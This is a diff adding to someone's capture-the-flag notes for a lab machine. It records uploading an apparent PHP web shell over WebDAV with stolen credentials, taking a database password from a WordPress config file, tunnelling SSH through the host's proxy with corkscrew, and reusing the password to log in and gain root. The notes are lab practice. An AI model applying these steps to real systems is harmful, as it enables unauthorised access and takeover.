@@ -252,3 +252,22 @@ curl --upload-file bash.php http://webdav_tester:babygurl69@10.10.10.67/webdav_t
 
 check wordpress config file for information about db username and password ROOT:VwPddNh7xMZyDQoByQL4 (hashed?) 
 
+connecting to ssh through the http proxy. 
+
+.ssh/config
+host *
+ ProxyCommand corkscrew 10.10.10.67 3128 %h %p 
+ 
+ ssh command
+ssh  cobb@127.0.0.1 pass: VwPddNh7xMZyDQoByQL4
+
+GET root: 
+
+sudo -s
+pass : VwPddNh7xMZyDQoByQL4
+
+/root/root.txt
+You're waiting for a train. A train that will take you far away. Wake up to find root.txt.
+
+
+
